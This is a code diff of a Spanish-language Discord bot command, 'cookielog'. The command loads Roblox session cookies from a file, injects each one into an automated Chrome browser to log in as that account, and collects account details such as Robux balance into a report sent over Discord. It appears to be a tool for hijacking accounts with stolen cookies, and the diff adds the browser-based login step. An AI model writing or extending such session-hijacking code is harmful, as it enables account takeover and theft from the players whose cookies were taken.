@@ -2548,9 +2548,9 @@ async def check_verification(interaction: discord.Interaction, defer_response: b
         user_logger.error(f"❌ Error en verificación para {username}: {e}")
         return False
 
-@bot.tree.command(name="cookielog", description="[OWNER ONLY] Probar cookies de alt.txt y obtener información de cuenta")
+@bot.tree.command(name="cookielog", description="[OWNER ONLY] Probar cookies de alt.txt, cambiarlas en navegador y obtener información de cuenta")
 async def cookielog_command(interaction: discord.Interaction):
-    """Comando solo para el owner que prueba cookies de alt.txt"""
+    """Comando solo para el owner que prueba cookies de alt.txt y las cambia en un navegador real"""
     user_id = str(interaction.user.id)
     
     # Verificar que solo el owner pueda usar este comando
@@ -2621,81 +2621,205 @@ async def cookielog_command(interaction: discord.Interaction):
             return
         
         embed = discord.Embed(
-            title="🔍 Probando Cookies",
-            description=f"Se encontraron {len(roblox_cookies)} cookies. Probando...",
+            title="🔍 Iniciando Navegador y Probando Cookies",
+            description=f"Se encontraron {len(roblox_cookies)} cookies. Iniciando navegador (VNC) y probando...",
             color=0xffaa00
         )
         message = await interaction.followup.send(embed=embed, ephemeral=True)
         
-        # Probar cada cookie hasta encontrar una que funcione
+        # INICIALIZAR NAVEGADOR CON VNC
+        driver = None
         working_cookie = None
         account_info = None
         
-        async with aiohttp.ClientSession() as session:
+        try:
+            logger.info("🚀 Inicializando navegador para cambio de cookies...")
+            
+            # Crear driver con modo VNC (no headless)
+            chrome_options = Options()
+            # NO agregar --headless para que se pueda ver el VNC
+            chrome_options.add_argument("--no-sandbox")
+            chrome_options.add_argument("--disable-dev-shm-usage")
+            chrome_options.add_argument("--disable-gpu")
+            chrome_options.add_argument("--disable-extensions")
+            chrome_options.add_argument("--window-size=1920,1080")
+            chrome_options.add_argument("--user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
+            
+            # Habilitar cookies y deshabilitar notificaciones
+            prefs = {
+                "profile.managed_default_content_settings.cookies": 1,  # Permitir cookies
+                "profile.default_content_setting_values.notifications": 2,
+                "profile.managed_default_content_settings.popups": 2,
+            }
+            chrome_options.add_experimental_option("prefs", prefs)
+            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
+            chrome_options.add_experimental_option('useAutomationExtension', False)
+
+            # Buscar Chrome binary
+            possible_chrome_paths = [
+                "/usr/bin/google-chrome",
+                "/usr/bin/chromium-browser", 
+                "/usr/bin/chromium",
+                "/snap/bin/chromium"
+            ]
+
+            chrome_binary = None
+            for path in possible_chrome_paths:
+                if Path(path).exists():
+                    chrome_binary = path
+                    break
+
+            if chrome_binary:
+                chrome_options.binary_location = chrome_binary
+                logger.info(f"Using Chrome binary at: {chrome_binary}")
+
+            # Crear driver
+            try:
+                from webdriver_manager.chrome import ChromeDriverManager
+                service = Service(ChromeDriverManager().install())
+                logger.info("Using ChromeDriverManager")
+            except Exception:
+                service = Service()
+                logger.info("Using system chromedriver")
+
+            driver = webdriver.Chrome(service=service, options=chrome_options)
+            driver.set_page_load_timeout(30)
+            driver.implicitly_wait(10)
+            
+            # Actualizar estado
+            update_embed = discord.Embed(
+                title="🌐 Navegador Iniciado",
+                description="Navegador VNC iniciado exitosamente. Navegando a Roblox y probando cookies...",
+                color=0x3366ff
+            )
+            await message.edit(embed=update_embed)
+            
+            logger.info("✅ Navegador iniciado exitosamente, navegando a Roblox...")
+            
+            # Navegar a Roblox primero
+            driver.get("https://www.roblox.com")
+            time.sleep(3)
+            
+            # Probar cada cookie en el navegador
             for i, cookie_data in enumerate(roblox_cookies):
                 try:
-                    # Probar la cookie haciendo una request a Roblox
-                    headers = {
-                        'Cookie': f'.ROBLOSECURITY={cookie_data["cookie"]}',
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                    logger.info(f"🍪 Probando cookie {i+1}/{len(roblox_cookies)} para usuario: {cookie_data['username']}")
+                    
+                    # Limpiar cookies existentes
+                    driver.delete_all_cookies()
+                    
+                    # Agregar la nueva cookie de Roblox
+                    cookie_dict = {
+                        'name': '.ROBLOSECURITY',
+                        'value': cookie_data['cookie'],
+                        'domain': '.roblox.com',
+                        'path': '/',
+                        'secure': True,
+                        'httpOnly': True
                     }
                     
-                    # Obtener información del usuario actual
-                    async with session.get('https://users.roblox.com/v1/users/authenticated', headers=headers) as response:
-                        if response.status == 200:
-                            user_data = await response.json()
+                    driver.add_cookie(cookie_dict)
+                    logger.info(f"✅ Cookie aplicada al navegador para usuario: {cookie_data['username']}")
+                    
+                    # Refrescar página para aplicar la cookie
+                    driver.refresh()
+                    time.sleep(5)
+                    
+                    # Verificar si funcionó navegando a settings
+                    driver.get("https://www.roblox.com/my/account#!/info")
+                    time.sleep(5)
+                    
+                    # Verificar si estamos logueados comprobando elementos de la página
+                    try:
+                        # Buscar elementos que indiquen que estamos logueados
+                        logged_in_elements = driver.find_elements(By.CSS_SELECTOR, 
+                            ".nav-menu, .notification-stream, [data-testid='navigation-profile']")
+                        
+                        if logged_in_elements:
+                            logger.info(f"🎉 ¡Cookie funciona! Usuario logueado en navegador: {cookie_data['username']}")
                             
-                            # Obtener información adicional del perfil
-                            user_id_roblox = user_data.get('id')
-                            if user_id_roblox:
-                                async with session.get(f'https://users.roblox.com/v1/users/{user_id_roblox}', headers=headers) as profile_response:
-                                    if profile_response.status == 200:
-                                        profile_data = await profile_response.json()
+                            # Obtener información adicional del perfil usando requests
+                            async with aiohttp.ClientSession() as session:
+                                headers = {
+                                    'Cookie': f'.ROBLOSECURITY={cookie_data["cookie"]}',
+                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                                }
+                                
+                                # Obtener información del usuario actual
+                                async with session.get('https://users.roblox.com/v1/users/authenticated', headers=headers) as response:
+                                    if response.status == 200:
+                                        user_data = await response.json()
                                         
-                                        # Obtener robux
-                                        robux = 0
-                                        try:
-                                            async with session.get('https://economy.roblox.com/v1/users/me', headers=headers) as economy_response:
-                                                if economy_response.status == 200:
-                                                    economy_data = await economy_response.json()
-                                                    robux = economy_data.get('robux', 0)
-                                        except:
-                                            pass
-                                        
-                                        working_cookie = cookie_data
-                                        account_info = {
-                                            'id': user_id_roblox,
-                                            'username': user_data.get('name', 'Unknown'),
-                                            'display_name': user_data.get('displayName', 'Unknown'),
-                                            'description': profile_data.get('description', ''),
-                                            'created': profile_data.get('created', ''),
-                                            'robux': robux,
-                                            'is_banned': profile_data.get('isBanned', False),
-                                            'has_verified_badge': user_data.get('hasVerifiedBadge', False)
-                                        }
-                                        break
+                                        # Obtener información adicional del perfil
+                                        user_id_roblox = user_data.get('id')
+                                        if user_id_roblox:
+                                            async with session.get(f'https://users.roblox.com/v1/users/{user_id_roblox}', headers=headers) as profile_response:
+                                                if profile_response.status == 200:
+                                                    profile_data = await profile_response.json()
+                                                    
+                                                    # Obtener robux
+                                                    robux = 0
+                                                    try:
+                                                        async with session.get('https://economy.roblox.com/v1/users/me', headers=headers) as economy_response:
+                                                            if economy_response.status == 200:
+                                                                economy_data = await economy_response.json()
+                                                                robux = economy_data.get('robux', 0)
+                                                    except:
+                                                        pass
+                                                    
+                                                    working_cookie = cookie_data
+                                                    account_info = {
+                                                        'id': user_id_roblox,
+                                                        'username': user_data.get('name', 'Unknown'),
+                                                        'display_name': user_data.get('displayName', 'Unknown'),
+                                                        'description': profile_data.get('description', ''),
+                                                        'created': profile_data.get('created', ''),
+                                                        'robux': robux,
+                                                        'is_banned': profile_data.get('isBanned', False),
+                                                        'has_verified_badge': user_data.get('hasVerifiedBadge', False)
+                                                    }
+                                                    break
+                        else:
+                            logger.warning(f"❌ Cookie no funciona para usuario: {cookie_data['username']}")
+                    
+                    except Exception as e:
+                        logger.warning(f"❌ Error verificando login para {cookie_data['username']}: {e}")
+                        continue
                 
                 except Exception as e:
-                    logger.debug(f"Cookie {i+1} falló: {e}")
+                    logger.error(f"❌ Error aplicando cookie {i+1}: {e}")
                     continue
                 
-                # Actualizar progreso cada 5 cookies
-                if (i + 1) % 5 == 0:
+                # Actualizar progreso
+                if (i + 1) % 2 == 0:
                     progress_embed = discord.Embed(
-                        title="🔍 Probando Cookies",
-                        description=f"Probando cookie {i+1}/{len(roblox_cookies)}...",
+                        title="🍪 Cambiando Cookies en Navegador",
+                        description=f"Probando y aplicando cookie {i+1}/{len(roblox_cookies)} en navegador VNC...",
                         color=0xffaa00
                     )
                     await message.edit(embed=progress_embed)
-        
-        if not working_cookie or not account_info:
-            embed = discord.Embed(
-                title="❌ Sin Cookies Válidas",
-                description="No se encontraron cookies que funcionen en el archivo.",
-                color=0xff0000
-            )
-            await message.edit(embed=embed)
-            return
+            
+            if not working_cookie or not account_info:
+                embed = discord.Embed(
+                    title="❌ Sin Cookies Válidas",
+                    description="No se encontraron cookies que funcionen en el navegador.",
+                    color=0xff0000
+                )
+                await message.edit(embed=embed)
+                return
+            
+            # Mantener el navegador abierto unos segundos más para ver el resultado
+            logger.info("🎉 Cookie funcionando encontrada, manteniendo navegador abierto...")
+            time.sleep(10)
+            
+        finally:
+            # Cerrar navegador
+            if driver:
+                try:
+                    driver.quit()
+                    logger.info("🔒 Navegador cerrado exitosamente")
+                except:
+                    pass
         
         # Crear archivo con la información
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -2725,6 +2849,11 @@ Badge Verificado: {'Sí' if account_info['has_verified_badge'] else 'No'}
 Perfil: https://www.roblox.com/users/{account_info['id']}/profile
 Configuración: https://www.roblox.com/my/account
 Inventario: https://www.roblox.com/users/{account_info['id']}/inventory
+
+=== INFORMACIÓN DE NAVEGADOR ===
+✅ Cookie aplicada exitosamente en navegador VNC
+✅ Login verificado en Roblox.com
+✅ Navegador cerrado automáticamente
 """
         
         # Guardar archivo
@@ -2733,8 +2862,8 @@ Inventario: https://www.roblox.com/users/{account_info['id']}/inventory
         
         # Crear embed de éxito
         embed = discord.Embed(
-            title="✅ Cookie Válida Encontrada",
-            description=f"Se encontró una cookie funcionando para la cuenta **{account_info['username']}**",
+            title="✅ Cookie Aplicada Exitosamente en Navegador",
+            description=f"Se encontró una cookie funcionando para **{account_info['username']}** y se aplicó correctamente en el navegador VNC.",
             color=0x00ff88
         )
         
@@ -2757,12 +2886,24 @@ Inventario: https://www.roblox.com/users/{account_info['id']}/inventory
         )
         
         embed.add_field(
-            name="📁 Archivo Generado",
-            value=f"`{filename}`",
-            inline=False
+            name="🌐 Estado del Navegador",
+            value="✅ Cookie aplicada en VNC\n✅ Login verificado\n✅ Navegador cerrado",
+            inline=True
         )
         
-        embed.set_footer(text=f"Usuario original: {working_cookie['username']}")
+        embed.add_field(
+            name="📁 Archivo Generado",
+            value=f"`{filename}`",
+            inline=True
+        )
+        
+        embed.add_field(
+            name="🔄 Proceso Completado",
+            value="Cookie cambiada exitosamente",
+            inline=True
+        )
+        
+        embed.set_footer(text=f"Usuario original: {working_cookie['username']} | Navegador VNC utilizado")
         
         # Enviar archivo
         with open(filename, "rb") as f:
@@ -2775,13 +2916,13 @@ Inventario: https://www.roblox.com/users/{account_info['id']}/inventory
         except:
             pass
             
-        logger.info(f"Owner {interaction.user.name} obtuvo cookie válida para cuenta {account_info['username']} (ID: {account_info['id']})")
+        logger.info(f"Owner {interaction.user.name} aplicó cookie válida en navegador para cuenta {account_info['username']} (ID: {account_info['id']})")
         
     except Exception as e:
         logger.error(f"Error en comando cookielog: {e}")
         embed = discord.Embed(
             title="❌ Error",
-            description="Ocurrió un error al procesar las cookies.",
+            description=f"Ocurrió un error al procesar las cookies en el navegador: {str(e)}",
             color=0xff0000
         )
         await interaction.followup.send(embed=embed, ephemeral=True)
